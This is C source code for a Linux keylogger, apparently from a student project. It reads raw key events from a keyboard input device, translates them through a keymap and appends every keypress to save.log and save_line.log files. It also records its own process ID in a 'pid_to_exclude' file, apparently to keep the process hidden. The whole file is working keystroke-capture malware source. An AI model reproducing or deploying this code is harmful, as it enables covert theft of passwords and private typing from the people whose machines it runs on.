#include "keylogger.h"

t_keylogger *getKlg()
{
	static t_keylogger klg;
	return &klg;
}

void	clean_quit(t_keylogger *klg, int code)
{
	close(klg->keyboardFD);
	close(klg->saveFD);
	exit(code);
}

void	save_pid(t_keylogger *klg)
{
	pid_t	pid;
	int		fd;

	pid = getpid();
	if (((fd = open("pid_to_exclude", O_RDWR | O_CREAT | O_TRUNC)) > -1)
		&& (write(fd, &pid, sizeof(pid)) > -1))
		dprintf(klg->logFD, "write pid with success: %d\n", pid);
	else
		dprintf(klg->logFD , "ERROR writing pid: %d\n", pid);
}

void	selectKey(t_keylogger *klg)
{
	int mod;

	mod = 0;
	if (klg->mod.alt || klg->mod.mod)
		mod += 4;
	if (klg->mod.shift)
		mod += 1;
	dprintf(klg->saveFD, "Key: %i State: %i, desc: %s\n",klg->event.code, klg->event.value, klg->keymap[klg->event.code -1][mod]);
	dprintf(klg->saveLineFD, "%s",klg->keymap[klg->event.code -1][mod]);
	return ;
}
void	recording(t_keylogger *klg)
{
	while(read(klg->keyboardFD, &klg->event, sizeof(klg->event)) > 0)
	{
		if(klg->event.type == EV_KEY
			&& is_mod_key(klg) == FALSE
			&& klg->event.value == 1)
				selectKey(klg);
	}
	return ;
}
int		parseData(t_keylogger *klg)
{
	if (get_next_line(klg->dataFD, &klg->event_location) == ERROR)
		return -1;
	if (get_next_line(klg->dataFD, &klg->rawMap) == ERROR)
		return -1;
	return 0;
}

void	keylogger(void)
{
	t_keylogger         *klg;


	klg = getKlg();
	signal_handle(klg);
	save_pid(klg);
	if((klg->logFD = open(LOGPATH, O_RDWR | O_CREAT, 0666)) <= 0)
		return ;
	if((klg->dataFD = open(DATAPATH, O_RDONLY)) <= 0)
		return ;
	parseData(klg);
	if((klg->keyboardFD = open(klg->event_location, O_RDONLY)) <= 0)
	{
		dprintf(klg->logFD, "open file failed\n");
		return ;
	}
	if((klg->saveFD = open("/home/user42/Bureau/keylogger/logs/save.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
	{
		dprintf(klg->logFD, "open save.log file failed\n");
		return ;
	}
	if((klg->saveLineFD = open("/home/user42/Bureau/keylogger/logs/save_line.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
	{
		dprintf(klg->logFD, "open save_line.log file failed\n");
		return ;
	}
	chmod("save.log", S_IROTH | S_IWOTH);
	if (setKeyMap(klg, klg->rawMap) == ERROR) //TODO enlever un parametre
		clean_quit(klg, ERROR);
	dprintf(klg->logFD, "Start recording\n");
	recording(klg);
	dprintf(klg->logFD, "Stop recording\n");
	clean_quit(klg, SUCCESS);
	return ;
}